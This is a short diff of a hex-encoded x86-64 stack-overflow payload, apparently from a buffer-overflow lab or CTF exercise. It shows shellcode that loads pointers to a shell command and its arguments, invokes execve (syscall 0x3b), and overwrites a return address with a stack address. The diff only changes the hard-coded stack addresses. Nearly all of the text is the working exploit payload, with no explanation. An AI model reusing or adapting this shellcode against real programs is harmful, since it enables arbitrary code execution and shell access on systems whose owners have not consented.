@@ -3,9 +3,9 @@
 00 00 00 00 00 00 00 00            /* PTR to -ils, this addr will go in rsi */ 
 00 00 00 00 00 00 00 00            /* NULL Byte to end array */
 48 c7 c0 3b 00 00 00               /* mov    $0x3b, %rax */
-48 bf 70 ec ff ff ff 7f 00 00      /* mov    <add>, %rdi */ 
-48 be 80 ec ff ff ff 7f 00 00      /* mov    <add>,  %rsi */
-48 ba 80 ec ff ff ff 7f 00 00      /* mov    <add>, %rdx */
+48 bf 10 ec ff ff ff 7f 00 00      /* mov    <add>, %rdi */ 
+48 be 20 ec ff ff ff 7f 00 00      /* mov    <add>,  %rsi */
+48 ba 20 ec ff ff ff 7f 00 00      /* mov    <add>, %rdx */
 0f 05                              /* syscall */
 90                                 /* pad */
-90 ec ff ff ff 7f 00 00            /* ret address */
+30 ec ff ff ff 7f 00 00            /* ret address */
